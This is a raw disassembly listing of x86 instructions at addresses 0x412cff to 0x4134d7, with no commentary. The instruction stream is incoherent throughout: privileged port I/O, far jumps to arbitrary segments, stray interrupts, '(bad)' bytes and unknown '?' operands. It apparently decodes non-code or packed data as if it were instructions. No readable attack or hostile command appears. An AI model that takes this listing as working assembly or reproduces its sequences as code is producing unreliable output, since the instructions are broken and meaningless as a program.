  412cff:	and    ah,BYTE PTR [edx-0x62]
  412d02:	fs out 0xca,al
  412d05:	cli    
  412d06:	or     ah,BYTE PTR [edx+edi*8-0x48d9c41c]
  412d0d:	popa   
  412d0e:	not    BYTE PTR [edx-0x1a]
  412d11:	fsubr  DWORD PTR [ecx-0x1a055cdc]
  412d17:	pusha  
  412d18:	not    DWORD PTR [ebx-0x6428c85a]
  412d1e:	pop    eax
  412d1f:	clc    
  412d20:	pop    edx
  412d21:	or     al,0x6a
  412d23:	mov    eax,0xf34b6ef2
  412d28:	adc    DWORD PTR [ecx+0x3a],ecx
  412d2b:	int    0x22
  412d2d:	adc    dl,dl
  412d2f:	sub    eax,0x23785291
  412d34:	add    BYTE PTR [ecx+esi*8+0x6d],ch
  412d38:	or     BYTE PTR [esi+ebx*1],0xa6
  412d3c:	jmp    0xa55b:0xacac8f72
  412d43:	sbb    BYTE PTR [ebx+0x1abafaf4],cl
  412d49:	pop    eax
  412d4a:	adc    ebx,DWORD PTR [esi]
  412d4c:	(bad)  
  412d4d:	adc    esi,DWORD PTR [ebx+0x54790907]
  412d53:	fcomp  DWORD PTR [edi]
  412d55:	xchg   esi,eax
  412d56:	pushf  
  412d57:	and    eax,0x92f0504
  412d5c:	adc    esi,DWORD PTR [ecx+0xb]
  412d5f:	mov    ch,0xee
  412d61:	pop    ss
  412d62:	inc    eax
  412d63:	dec    esi
  412d64:	mov    dl,al
  412d66:	jmp    0x412d1e
  412d68:	push   ds
  412d69:	and    eax,0x962dedea
  412d6e:	add    al,0xbf
  412d70:	scas   al,BYTE PTR es:[edi]
  412d71:	fisttp DWORD PTR [ebp-0x60f2fc07]
  412d77:	and    al,0xb1
  412d79:	pop    ebx
  412d7a:	sub    bl,BYTE PTR [eax]
  412d7c:	cmc    
  412d7d:	in     al,dx
  412d7e:	jl     0x412d5f
  412d80:	imul   BYTE PTR fs:[ebx]
  412d83:	pop    esp
  412d84:	xor    edi,eax
  412d86:	iret   
  412d87:	call   0xb9189c01
  412d8c:	mov    al,0x3b
  412d8e:	pop    ecx
  412d8f:	add    DWORD PTR es:[edi],0xffffffa8
  412d93:	adc    edi,eax
  412d95:	add    BYTE PTR [eax+0x5b],ah
  412d98:	sbb    edx,DWORD PTR [ecx+0x52]
  412d9b:	xor    esi,DWORD PTR [eax+0x16]
  412d9e:	xchg   ecx,eax
  412d9f:	rcr    ecx,0xfa
  412da2:	xor    al,0xe
  412da4:	and    BYTE PTR [edx+ebx*4],ch
  412da7:	jl     0x412d96
  412da9:	add    ch,BYTE PTR ds:0x2f314842
  412daf:	in     eax,0x9
  412db1:	pop    edx
  412db2:	sbb    DWORD PTR [ebx-0x3d],0x45afbf6e
  412db9:	jmp    0xb221bce3
  412dbe:	ret    0xe80d
  412dc1:	test   eax,0x41a73c2f
  412dc6:	dec    edx
  412dc7:	xor    eax,0x16715c9d
  412dcc:	push   cs
  412dcd:	cmp    DWORD PTR [ebx+0x2],eax
  412dd0:	ds dec esp
  412dd2:	ins    DWORD PTR es:[edi],dx
  412dd3:	jl     0x412d5c
  412dd5:	cmp    ebp,DWORD PTR [eax+0x6a]
  412dd8:	or     al,0x49
  412dda:	pop    esi
  412ddb:	daa    
  412ddc:	xor    dl,BYTE PTR [eax-0x4a940b9b]
  412de2:	and    al,0x2
  412de4:	lods   eax,DWORD PTR ds:[esi]
  412de5:	lock fstp QWORD PTR [edi-0x43acbed3]
  412dec:	sti    
  412ded:	mov    edi,0x3bd4018a
  412df2:	je     0x412d81
  412df4:	lods   eax,DWORD PTR ds:[esi]
  412df5:	mov    edi,0x1554c910
  412dfa:	call   0xa901:0x578bd35
  412e01:	adc    BYTE PTR [edx+0x5d],0xe0
  412e05:	dec    ebp
  412e06:	shl    DWORD PTR [eax],1
  412e08:	fsubr  QWORD PTR [ecx-0x36]
  412e0b:	bound  esp,QWORD PTR [ebx+0x4a61a2e0]
  412e11:	push   cs
  412e12:	push   eax
  412e13:	jmp    0x17055eb7
  412e18:	xor    eax,0x690d08f3
  412e1d:	jnp    0x412dd4
  412e1f:	sar    DWORD PTR [ebx+0x7d1747da],cl
  412e25:	xchg   esp,eax
  412e26:	scas   al,BYTE PTR es:[edi]
  412e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e28:	or     ebp,edx
  412e2a:	and    DWORD PTR [ecx],edx
  412e2c:	test   al,0x31
  412e2e:	push   0xe21f5b22
  412e33:	imul   esp,DWORD PTR [ebp+0x341ff7ec],0xfffffff0
  412e3a:	sbb    eax,0xf0f72f06
  412e3f:	imul   edx,DWORD PTR [ecx+0x4eca1663],0x11
  412e46:	in     al,0x9e
  412e48:	fdiv   st(5),st
  412e4a:	dec    edx
  412e4b:	add    eax,0x6349dd3d
  412e50:	icebp  
  412e51:	push   esi
  412e52:	jno    0x412e39
  412e54:	mov    ds:0xa0959821,eax
  412e59:	jbe    0x412ed1
  412e5b:	cmp    eax,esi
  412e5d:	cmp    DWORD PTR [eax-0x5beb1091],esi
  412e63:	xor    dh,ah
  412e65:	outs   dx,DWORD PTR ds:[esi]
  412e66:	popa   
  412e67:	pop    ecx
  412e68:	mov    edi,0x5aa51e7e
  412e6d:	pop    ds
  412e6e:	push   esi
  412e6f:	inc    edi
  412e70:	int3   
  412e71:	or     BYTE PTR [ecx-0xd589909],dh
  412e77:	(bad)  
  412e78:	pop    eax
  412e79:	test   eax,0xb7889df0
  412e7e:	(bad)  
  412e7f:	mov    ebp,0xa545c14e
  412e84:	mov    ds:0xe813f48d,eax
  412e89:	jbe    0x412eb4
  412e8b:	jo     0x412ed6
  412e8d:	push   ebx
  412e8e:	out    dx,eax
  412e8f:	test   eax,0xc86c6007
  412e94:	or     DWORD PTR [ecx],edi
  412e96:	add    eax,0xc9b4b829
  412e9b:	icebp  
  412e9c:	ja     0x412e90
  412e9e:	xor    al,0x48
  412ea0:	jns    0x412e74
  412ea2:	scas   eax,DWORD PTR es:[edi]
  412ea3:	mov    ch,ah
  412ea5:	in     al,0x3c
  412ea7:	sub    ch,BYTE PTR [ebx]
  412ea9:	pop    esi
  412eaa:	mov    ch,0xbd
  412eac:	mov    ecx,0x7af1adaf
  412eb1:	pop    ecx
  412eb2:	jle    0x412e5c
  412eb4:	aaa    
  412eb5:	xchg   ebp,eax
  412eb6:	fadd   QWORD PTR [ebp-0x24]
  412eb9:	pop    es
  412eba:	sar    BYTE PTR [edx],cl
  412ebc:	imul   DWORD PTR [ebx+0x13]
  412ebf:	cmp    bh,ah
  412ec1:	not    ah
  412ec3:	jbe    0x412f26
  412ec5:	mov    cl,0xfa
  412ec7:	data16 aad 0xfb
  412eca:	pop    ebp
  412ecb:	adc    ah,ah
  412ecd:	push   esi
  412ece:	enter  0xe33f,0x6b
  412ed2:	adc    al,0xb2
  412ed4:	outs   dx,BYTE PTR ds:[esi]
  412ed5:	das    
  412ed6:	push   cs
  412ed7:	add    ecx,esp
  412ed9:	cmp    BYTE PTR [edx+0x51],cl
  412edc:	jge    0x412f42
  412ede:	xchg   esp,eax
  412edf:	add    BYTE PTR [edx+0x19],dh
  412ee2:	mov    WORD PTR [esi+0x4fcbe097],ss
  412ee8:	push   ecx
  412ee9:	sahf   
  412eea:	retf   0x40ae
  412eed:	call   0xcdd3fad1
  412ef2:	cmp    al,0xdc
  412ef4:	enter  0xcaa1,0xa2
  412ef8:	push   ebx
  412ef9:	fistp  QWORD PTR [ecx]
  412efb:	aaa    
  412efc:	sbb    ch,dh
  412efe:	push   edi
  412eff:	xor    al,BYTE PTR [eax-0x10c9da3e]
  412f05:	ja     0x412f1c
  412f07:	push   ebp
  412f08:	push   edx
  412f09:	mov    edx,0x9b0efe52
  412f0e:	sub    eax,0xdc50716a
  412f13:	lea    eax,[edi+edx*1+0x6072f5f]
  412f1a:	and    eax,0xd6029a74
  412f1f:	es push es
  412f21:	int3   
  412f22:	out    dx,eax
  412f23:	mov    esp,0x657e6688
  412f28:	fist   DWORD PTR [ecx+0x2d]
  412f2b:	sti    
  412f2c:	xor    al,0xa
  412f2e:	ds push es
  412f30:	adc    DWORD PTR [eax],eax
  412f32:	outs   dx,DWORD PTR ds:[esi]
  412f33:	mov    ds:0x1ee67470,al
  412f38:	ror    BYTE PTR [ebx],1
  412f3a:	ret    
  412f3b:	fild   WORD PTR [eax+eax*2-0x22903707]
  412f42:	ret    
  412f43:	add    ebp,eax
  412f45:	ins    BYTE PTR es:[edi],dx
  412f46:	lahf   
  412f47:	push   edx
  412f48:	fisub  DWORD PTR [eax-0x307b8a57]
  412f4e:	jb     0x412f49
  412f50:	pop    esi
  412f51:	jle    0x412f3d
  412f53:	push   esi
  412f54:	(bad)  
  412f55:	push   0xf7dad119
  412f5a:	mov    ecx,0xa2a51b55
  412f5f:	ret    0xf23c
  412f62:	jge    0x412fa8
  412f64:	sbb    BYTE PTR [esi-0x4e],0x93
  412f68:	das    
  412f69:	in     eax,0x2c
  412f6b:	cdq    
  412f6c:	ret    0xa57e
  412f6f:	pusha  
  412f70:	dec    esp
  412f71:	mov    al,0x95
  412f73:	neg    ah
  412f75:	mov    al,0xfd
  412f77:	je     0x412f21
  412f79:	pop    edi
  412f7a:	into   
  412f7b:	inc    ecx
  412f7c:	adc    ebx,DWORD PTR [esi+eax*1-0x4d]
  412f80:	repnz mov cl,0x86
  412f83:	xor    al,0xcd
  412f85:	jg     0x412f7c
  412f87:	mov    ecx,0x97421ce2
  412f8c:	inc    esi
  412f8d:	pop    eax
  412f8e:	or     al,0xfd
  412f90:	mov    WORD PTR [ecx+0x1d5a4cad],?
  412f96:	ja     0x412f4e
  412f98:	xchg   ebp,eax
  412f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f9a:	sti    
  412f9b:	std    
  412f9c:	popa   
  412f9d:	add    BYTE PTR [ebx+0x665809df],0x90
  412fa4:	nop
  412fa5:	test   BYTE PTR [eax-0x24effa10],dl
  412fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fac:	or     DWORD PTR [eax+0x1a05379b],ebx
  412fb2:	in     al,dx
  412fb3:	push   esp
  412fb4:	and    al,0xd7
  412fb6:	nop
  412fb7:	fwait
  412fb8:	or     edx,DWORD PTR [ebx-0x6fdabfd8]
  412fbe:	arpl   WORD PTR [edx-0x7b065cee],dx
  412fc4:	hlt    
  412fc5:	in     eax,0xd5
  412fc7:	sbb    BYTE PTR [eax],0x19
  412fca:	in     eax,dx
  412fcb:	outs   dx,DWORD PTR ds:[esi]
  412fcc:	cmp    bl,BYTE PTR [esi+0x39]
  412fcf:	and    ah,al
  412fd1:	xlat   BYTE PTR ds:[ebx]
  412fd2:	fs inc ebp
  412fd4:	addr16 popf 
  412fd6:	fwait
  412fd7:	test   al,0x18
  412fd9:	pop    es
  412fda:	int    0x1
  412fdc:	fwait
  412fdd:	clc    
  412fde:	add    ah,BYTE PTR [ebx-0x61]
  412fe1:	inc    esp
  412fe2:	test   ah,cl
  412fe4:	(bad)  
  412fe5:	hlt    
  412fe6:	(bad)  
  412fe7:	test   al,0xa9
  412fe9:	pop    es
  412fea:	add    al,bh
  412fec:	jae    0x413037
  412fee:	dec    edi
  412fef:	sbb    cl,BYTE PTR [ecx+0x5edb76f5]
  412ff5:	aas    
  412ff6:	in     eax,0xb7
  412ff8:	scas   eax,DWORD PTR es:[edi]
  412ff9:	nop
  412ffa:	repnz popf 
  412ffc:	dec    esp
  412ffd:	cld    
  412ffe:	mov    esp,0xe7886d9f
  413003:	xor    al,0x72
  413005:	push   ds
  413006:	pushf  
  413007:	out    dx,eax
  413008:	fidivr WORD PTR [edi]
  41300a:	ret    0x63c5
  41300d:	dec    edx
  41300e:	pop    edx
  41300f:	stos   BYTE PTR es:[edi],al
  413010:	mov    cl,0xc2
  413012:	push   esp
  413013:	leave  
  413014:	push   ebx
  413015:	in     al,0xda
  413017:	cmp    DWORD PTR ds:0x71250525,edi
  41301d:	sbb    al,0xe
  41301f:	mov    ds:0xb6d2e9e7,al
  413024:	fimul  DWORD PTR [eax+0x57]
  413027:	xchg   esi,eax
  413028:	out    dx,al
  413029:	or     eax,0x77535455
  41302e:	or     BYTE PTR [edi],bl
  413030:	cmp    bl,BYTE PTR [ecx-0x6a]
  413033:	dec    ebp
  413034:	clc    
  413035:	mov    edx,edx
  413037:	sbb    bl,BYTE PTR [ecx]
  413039:	pop    esi
  41303a:	in     eax,dx
  41303b:	lahf   
  41303c:	mov    al,0xa4
  41303e:	leave  
  41303f:	lds    eax,FWORD PTR [eax+0xa]
  413042:	inc    edx
  413043:	in     eax,0xfa
  413045:	cmp    eax,0x7dd8369b
  41304a:	call   0x15f0:0xe079e0c5
  413051:	jmp    0x23926057
  413056:	push   0xd6b0c5fe
  41305b:	xlat   BYTE PTR ds:[ebx]
  41305c:	cmp    BYTE PTR [esi-0x16],0x4c
  413060:	or     esp,DWORD PTR [edi-0x171d4c52]
  413066:	or     esi,DWORD PTR [ebp+0x65]
  413069:	or     BYTE PTR [ebx-0x66],dl
  41306c:	inc    ebp
  41306d:	adc    ch,BYTE PTR [ebx+0x26]
  413070:	lods   al,BYTE PTR ds:[esi]
  413071:	xor    BYTE PTR [edi+0x6472967c],cl
  413077:	pop    edx
  413078:	pop    ss
  413079:	sub    DWORD PTR [eax],edi
  41307b:	mov    ebx,DWORD PTR [eax-0x31c1ce08]
  413081:	or     eax,0x7580b2cb
  413086:	call   0xfaefd3a0
  41308b:	sahf   
  41308c:	loopne 0x4130b3
  41308e:	mov    bh,0x72
  413090:	xchg   edi,eax
  413091:	retf   
  413092:	mov    ds:0x91156d1e,al
  413097:	aam    0x94
  413099:	jo     0x413076
  41309b:	imul   ebx,DWORD PTR ds:0x7c779bf,0x27
  4130a2:	sub    ah,BYTE PTR [eax]
  4130a4:	test   BYTE PTR [esi],bl
  4130a6:	pop    es
  4130a7:	je     0x413051
  4130a9:	pop    eax
  4130aa:	pop    edi
  4130ab:	sbb    eax,DWORD PTR [ecx+0x5]
  4130ae:	rcr    BYTE PTR [eax],1
  4130b0:	xchg   BYTE PTR [ecx+edi*1-0x7f0728a],ah
  4130b7:	fnstcw WORD PTR [eax+0x7c]
  4130ba:	in     al,0xe9
  4130bc:	ror    BYTE PTR [edi+esi*4-0x15],1
  4130c0:	mov    dh,0x37
  4130c2:	ds in  eax,0xce
  4130c5:	(bad)  
  4130c7:	iret   
  4130c8:	push   ebx
  4130c9:	mov    DWORD PTR [esi],ebp
  4130cb:	daa    
  4130cc:	ds pop ebp
  4130ce:	mov    al,ds:0x4f0ac226
  4130d3:	mov    edi,0x5938a6bb
  4130d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d9:	ins    DWORD PTR es:[edi],dx
  4130da:	xlat   BYTE PTR ds:[ebx]
  4130db:	fsub   st(0),st
  4130dd:	out    0x88,al
  4130df:	out    0x81,al
  4130e1:	mov    ch,0xd5
  4130e3:	ins    BYTE PTR es:[edi],dx
  4130e4:	inc    esp
  4130e5:	std    
  4130e6:	jmp    0x41308a
  4130e8:	mov    ch,0xd
  4130ea:	and    esi,ebx
  4130ec:	imul   ebx
  4130ee:	stc    
  4130ef:	push   eax
  4130f0:	add    DWORD PTR [esi],edi
  4130f2:	add    BYTE PTR [edx],bh
  4130f4:	xor    dh,BYTE PTR [ecx+eiz*8+0x14eedf47]
  4130fb:	rcr    DWORD PTR [eax],0xaf
  4130fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ff:	xchg   edx,eax
  413100:	in     eax,0xa4
  413102:	pop    esp
  413103:	mov    al,0xbc
  413105:	icebp  
  413106:	aad    0xa3
  413108:	aam    0xfe
  41310a:	ja     0x413169
  41310c:	pop    edi
  41310d:	int    0x49
  41310f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413110:	jbe    0x413175
  413112:	outs   dx,BYTE PTR ds:[esi]
  413113:	mov    ds:0x49883b34,eax
  413118:	iret   
  413119:	cwde   
  41311a:	repz mov ch,0x66
  41311d:	stos   DWORD PTR es:[edi],eax
  41311e:	mov    al,0xff
  413120:	add    esp,DWORD PTR [edi+0x51]
  413123:	jmp    0xf9231917
  413128:	xchg   BYTE PTR ds:[esi-0x51],al
  41312c:	xchg   ecx,eax
  41312d:	cmp    al,0x67
  41312f:	xchg   ecx,eax
  413130:	cmc    
  413131:	(bad)  
  413132:	cmp    BYTE PTR [eax-0x454a90f1],bh
  413138:	enter  0xaf23,0xd5
  41313c:	les    edi,FWORD PTR [eax*2-0x44386f13]
  413143:	aam    0x8d
  413145:	outs   dx,DWORD PTR ds:[esi]
  413146:	lods   eax,DWORD PTR ds:[esi]
  413147:	push   0x1ec13ab6
  41314c:	pop    edi
  41314d:	leave  
  41314e:	adc    al,0xab
  413150:	push   ds
  413151:	sar    DWORD PTR cs:[ebx+0x3f],cl
  413155:	adc    BYTE PTR [ebp+0x609c290e],ch
  41315b:	popf   
  41315c:	xor    ebp,DWORD PTR [edx+0x4e]
  41315f:	adc    bl,BYTE PTR [edx-0x30b2d2a6]
  413165:	retf   
  413166:	xchg   ecx,eax
  413167:	xor    dl,BYTE PTR [edx-0x6fe79a1d]
  41316d:	psadbw mm5,QWORD PTR [edx]
  413170:	scas   al,BYTE PTR es:[edi]
  413171:	push   ebx
  413172:	or     eax,DWORD PTR [ebp-0x5d]
  413175:	iret   
  413176:	add    dl,ch
  413178:	mov    WORD PTR [edi+edx*4+0x61d41bb9],ds
  41317f:	mov    bl,0xc8
  413181:	loop   0x413186
  413183:	scas   eax,DWORD PTR es:[edi]
  413184:	call   0x8303:0x951d44c3
  41318b:	stos   BYTE PTR es:[edi],al
  41318c:	mov    ah,BYTE PTR [edi]
  41318e:	out    dx,eax
  41318f:	(bad)  
  413190:	(bad)  
  413191:	cmp    bl,BYTE PTR [ecx]
  413193:	loope  0x413141
  413195:	(bad)  
  413196:	retf   0xfa7c
  413199:	into   
  41319a:	enter  0xc0bf,0xed
  41319e:	popf   
  41319f:	addr16 ds pusha 
  4131a2:	jp     0x4131d0
  4131a4:	dec    ecx
  4131a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131a6:	push   0x4456ef0c
  4131ab:	repz push ds
  4131ad:	mov    WORD PTR [edx+esi*4-0x5b7d6e9d],?
  4131b4:	lods   al,BYTE PTR ds:[esi]
  4131b5:	add    ebp,DWORD PTR [ebx]
  4131b7:	ret    
  4131b8:	mov    al,0x71
  4131ba:	mov    fs,WORD PTR [edi-0x29]
  4131bd:	imul   ebp,DWORD PTR [eax],0xffffffa7
  4131c0:	lock dec eax
  4131c2:	xchg   esp,eax
  4131c3:	adc    BYTE PTR [esi-0x49],al
  4131c6:	test   eax,0x46bfc7f7
  4131cb:	mov    ds:0x8af0da65,al
  4131d0:	jns    0x4131c4
  4131d2:	shl    DWORD PTR ds:0xe9fc5fca,cl
  4131d8:	fiadd  DWORD PTR [eax+0x27]
  4131db:	mov    eax,ds:0xc6a83239
  4131e0:	int    0x30
  4131e2:	mov    ebp,0xd31b0326
  4131e7:	mov    ebp,0xd42687d7
  4131ec:	ss adc eax,0x2e649baa
  4131f2:	je     0x41322e
  4131f4:	jnp    0x4131d8
  4131f6:	in     al,0x1e
  4131f8:	loop   0x413273
  4131fa:	mov    ecx,0xb86a47ef
  4131ff:	cmc    
  413200:	mov    esp,0x908ab4
  413205:	cld    
  413206:	mov    esi,0xc53f9d49
  41320b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41320c:	inc    edi
  41320d:	mov    eax,ds:0x5a3afd70
  413212:	or     ch,BYTE PTR [eax+0x631ed7da]
  413218:	add    BYTE PTR [edx-0x4a07b9d7],bl
  41321e:	fwait
  41321f:	repz sbb BYTE PTR [edx],dl
  413222:	scas   al,BYTE PTR es:[edi]
  413223:	hlt    
  413224:	es mov ch,0xd7
  413227:	jmp    0x4fe7:0x93fc675f
  41322e:	adc    eax,0x19bb2eb6
  413233:	dec    esp
  413234:	cdq    
  413235:	aaa    
  413236:	cmp    al,0x4d
  413238:	cmp    eax,0x9c6a0493
  41323d:	je     0x4131cc
  41323f:	mov    al,ds:0x12c8e814
  413244:	sub    cl,BYTE PTR [esi]
  413246:	shl    DWORD PTR [eax],cl
  413248:	mov    al,0x18
  41324a:	pop    esp
  41324b:	mov    ?,WORD PTR [edx-0x6b249132]
  413251:	mov    edx,DWORD PTR [edx+0x4a]
  413254:	jecxz  0x41325b
  413256:	inc    esp
  413257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413258:	add    al,0x3a
  41325a:	xor    BYTE PTR [eax+0x51a492c],bh
  413260:	push   edi
  413261:	mov    dl,0xf8
  413263:	das    
  413264:	mov    ah,0x51
  413266:	aam    0x50
  413268:	aad    0xd0
  41326a:	test   al,0xa2
  41326c:	mov    ds:0x9b08909d,eax
  413271:	(bad)  
  413272:	aaa    
  413273:	xchg   edi,eax
  413274:	xchg   esi,eax
  413275:	xchg   ebp,eax
  413276:	mov    dl,0x14
  413278:	retf   0x70b7
  41327b:	sti    
  41327c:	ret    0xf4f7
  41327f:	add    DWORD PTR [ebp-0x896c867],ebx
  413285:	push   ecx
  413286:	clc    
  413287:	test   al,0x19
  413289:	mov    DWORD PTR [ebp+0x61251345],ebp
  41328f:	mov    esp,0xe5eea230
  413294:	jne    0x4132c8
  413296:	pop    edi
  413297:	adc    BYTE PTR [eax-0x1345b236],bl
  41329d:	rol    dh,cl
  41329f:	repnz inc eax
  4132a1:	mov    ?,ebp
  4132a3:	mov    edx,0x8872bf28
  4132a9:	rcr    BYTE PTR [eax],1
  4132ab:	jmp    0x829c446a
  4132b0:	mov    dh,BYTE PTR [ecx-0x57]
  4132b3:	sub    edx,DWORD PTR [ebx+0x49]
  4132b6:	adc    al,0x4b
  4132b8:	sbb    bh,BYTE PTR [ecx-0x187d2cd4]
  4132be:	test   bl,0x35
  4132c1:	cmp    al,0x7e
  4132c3:	lods   eax,DWORD PTR ds:[esi]
  4132c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132c5:	xchg   esp,eax
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	sub    ebx,DWORD PTR [edx+0x7a]
  4132ca:	jge    0x41326f
  4132cc:	out    dx,eax
  4132cd:	div    BYTE PTR [ebx+0x3d534fe7]
  4132d3:	ja     0x4132e6
  4132d5:	out    dx,al
  4132d6:	(bad)  
  4132d7:	mov    eax,0xddeefb1d
  4132dc:	cmp    BYTE PTR gs:[edx+0x7a],ah
  4132e0:	shr    eax,1
  4132e2:	mov    bh,0xb4
  4132e4:	adc    ch,BYTE PTR [esi-0x790e54d4]
  4132ea:	mov    ch,0x6b
  4132ec:	xor    eax,0xcbe85b7b
  4132f1:	data16 test al,0xe
  4132f4:	xor    BYTE PTR [ebx-0x8],bl
  4132f7:	mov    ds:0x4f50e0dc,eax
  4132fc:	sar    DWORD PTR [esi+0x7b523f48],cl
  413302:	xor    esp,ebp
  413304:	xchg   esp,eax
  413305:	push   esp
  413306:	arpl   WORD PTR [ecx-0x1c25b50f],ax
  41330c:	sar    ebx,1
  41330e:	addr16 dec ecx
  413310:	add    al,0xad
  413312:	das    
  413313:	sbb    di,sp
  413316:	mov    ebx,0x367c4ced
  41331b:	int3   
  41331c:	push   edx
  41331d:	out    dx,al
  41331e:	dec    esp
  41331f:	inc    esp
  413320:	in     eax,0xc
  413322:	and    ecx,ebx
  413324:	dec    esi
  413325:	aam    0x7e
  413327:	aaa    
  413328:	bnd js 0x4132ec
  41332b:	sub    ecx,edx
  41332d:	xchg   esp,eax
  41332e:	push   esp
  41332f:	xor    bl,BYTE PTR [ebp+0xf]
  413332:	or     al,0xb7
  413334:	mov    ch,0xca
  413336:	js     0x4132fa
  413338:	ret    
  413339:	jp     0x41337d
  41333b:	inc    esi
  41333c:	xchg   bl,ch
  41333e:	pop    edi
  41333f:	xchg   ebp,eax
  413340:	adc    dl,BYTE PTR [ebp+0x198ab54f]
  413346:	(bad)  
  413348:	lahf   
  413349:	dec    ecx
  41334a:	dec    ecx
  41334b:	ja     0x41335d
  41334d:	rcl    DWORD PTR ds:0xd1aab905,1
  413353:	ret    0x3edd
  413356:	cld    
  413357:	xchg   ebx,eax
  413358:	mov    ecx,0xecd3609e
  41335d:	jno    0x413345
  41335f:	push   0x35
  413361:	sub    esi,esi
  413363:	loop   0x413397
  413365:	fyl2xp1 
  413367:	and    esi,DWORD PTR [edx+0x4c9e9f1b]
  41336d:	bnd ja 0x413352
  413370:	sti    
  413371:	mov    dh,0xdd
  413373:	in     eax,dx
  413374:	mov    eax,0xcab6252a
  413379:	fs push esi
  41337b:	push   ss
  41337c:	enter  0xd0d8,0x31
  413380:	(bad)  
  413381:	mov    al,ds:0x6c3b5bf4
  413386:	outs   dx,BYTE PTR ds:[esi]
  413387:	xchg   edx,eax
  413388:	jb     0x4133a4
  41338a:	div    DWORD PTR [ebp+ecx*8-0x4e]
  41338e:	push   eax
  41338f:	mov    esi,0x2d8565cf
  413394:	pushf  
  413395:	shr    DWORD PTR [esi],1
  413397:	arpl   bx,bp
  413399:	pop    ecx
  41339a:	das    
  41339b:	cmp    al,0xf2
  41339d:	hlt    
  41339e:	sub    al,0x1
  4133a0:	ss or  al,0xc5
  4133a3:	jbe    0x41337a
  4133a5:	sub    eax,0x68aa5935
  4133aa:	stos   DWORD PTR es:[edi],eax
  4133ab:	shl    edi,1
  4133ad:	inc    edx
  4133ae:	les    edi,FWORD PTR [edi-0x57]
  4133b1:	(bad)  
  4133b2:	stc    
  4133b3:	xor    bl,BYTE PTR [edx+0x2c7805b2]
  4133b9:	mov    bh,0xa4
  4133bb:	sbb    dl,BYTE PTR [esi-0x54]
  4133be:	sbb    dl,BYTE PTR [ebx-0x17f381cf]
  4133c4:	sub    ebp,edi
  4133c6:	ins    BYTE PTR es:[edi],dx
  4133c7:	xor    BYTE PTR [edx-0x68],al
  4133ca:	jmp    0x4fee:0xb6fb1134
  4133d1:	test   eax,0x41c88c18
  4133d6:	test   eax,0x3afe7e35
  4133db:	mov    al,ds:0xbdf27483
  4133e0:	mov    al,BYTE PTR [esi+0x17]
  4133e3:	pop    es
  4133e4:	fdiv   QWORD PTR [ebx+0x9]
  4133e7:	pusha  
  4133e8:	xchg   edx,eax
  4133e9:	pop    eax
  4133ea:	mov    dl,0x6d
  4133ec:	add    eax,0xc7a388b0
  4133f1:	and    ecx,DWORD PTR [edi-0x5f]
  4133f4:	jnp    0x4133e6
  4133f6:	aam    0x8e
  4133f8:	push   edx
  4133f9:	xchg   ecx,eax
  4133fa:	ins    DWORD PTR es:[edi],dx
  4133fb:	mov    ebx,0x7264c5ab
  413400:	or     ebx,DWORD PTR [edi+ebp*2-0x37]
  413404:	adc    al,0xa5
  413406:	cli    
  413407:	inc    esi
  413408:	inc    DWORD PTR [edx-0x4e]
  41340b:	iret   
  41340c:	xor    BYTE PTR [eax],cl
  41340e:	shr    BYTE PTR [ebx+ebp*4+0x7181efa9],1
  413415:	bnd jo 0x413403
  413418:	xor    cl,BYTE PTR [eax+ebp*4-0x7ddadb11]
  41341f:	mov    fs,WORD PTR [ebp-0x3644e7c2]
  413425:	cld    
  413426:	sbb    dl,BYTE PTR [ebp+edi*4+0x53a4fe1e]
  41342d:	jle    0x413458
  41342f:	or     DWORD PTR cs:[ebp-0x25],ecx
  413433:	es jbe 0x4134ab
  413436:	pop    edi
  413437:	punpckhbw mm5,mm2
  41343a:	mov    esi,0xb23c4728
  41343f:	adc    al,0x3e
  413441:	push   esp
  413442:	push   ecx
  413443:	xchg   ebx,eax
  413444:	vpmulhw xmm5,xmm6,XMMWORD PTR [ebx-0x4e44e3e2]
  41344c:	lahf   
  41344d:	xchg   BYTE PTR [eax],dl
  41344f:	lods   al,BYTE PTR ds:[esi]
  413450:	xor    eax,0xda44d62d
  413455:	push   esi
  413456:	dec    DWORD PTR [esp+esi*1]
  413459:	lds    ecx,FWORD PTR [ebx+0x10]
  41345c:	or     dl,BYTE PTR [eax-0x4d]
  41345f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413460:	add    esp,esp
  413462:	jge    0x413407
  413464:	aad    0x38
  413466:	inc    edx
  413467:	pop    si
  413469:	xchg   DWORD PTR [esp+ebx*8+0x7eeb80d9],esi
  413470:	xchg   DWORD PTR ds:0xeef4e745,edx
  413476:	popa   
  413477:	xchg   DWORD PTR [esi+0x33],esp
  41347a:	fisttp DWORD PTR [ebx-0x12]
  41347d:	or     DWORD PTR [edx+0x4],eax
  413480:	ror    DWORD PTR [edx+0x7cc3c411],0x8b
  413487:	popf   
  413488:	xchg   edi,eax
  413489:	xor    eax,0xdac6d779
  41348e:	data16 cmp al,0x53
  413491:	mov    al,ds:0xf4c4a608
  413496:	push   edx
  413497:	xchg   ebp,eax
  413498:	(bad)  
  41349a:	data16 add bl,al
  41349d:	call   0x869:0x1827e68a
  4134a4:	lock mov al,0x96
  4134a7:	sbb    ebp,DWORD PTR [ebp-0x48]
  4134aa:	jns    0x4134df
  4134ac:	ret    0x1c4f
  4134af:	mov    ebp,0x3f24db17
  4134b4:	repz mov ds:0xe4edf68d,eax
  4134ba:	push   esp
  4134bb:	xor    al,0x14
  4134bd:	mov    al,cl
  4134bf:	cdq    
  4134c0:	fidiv  DWORD PTR [ecx-0x4d]
  4134c3:	fnstsw WORD PTR [ebx]
  4134c5:	int3   
  4134c6:	(bad)  
  4134c7:	cmp    ebp,DWORD PTR [edx-0x6d4451ad]
  4134cd:	(bad)  
  4134ce:	jmp    0x413483
  4134d0:	dec    esi
  4134d1:	retf   0x9a9a
  4134d4:	lods   al,BYTE PTR ds:[esi]
  4134d5:	adc    al,0x25
  4134d7:	mov    al,ds:0x37856e89
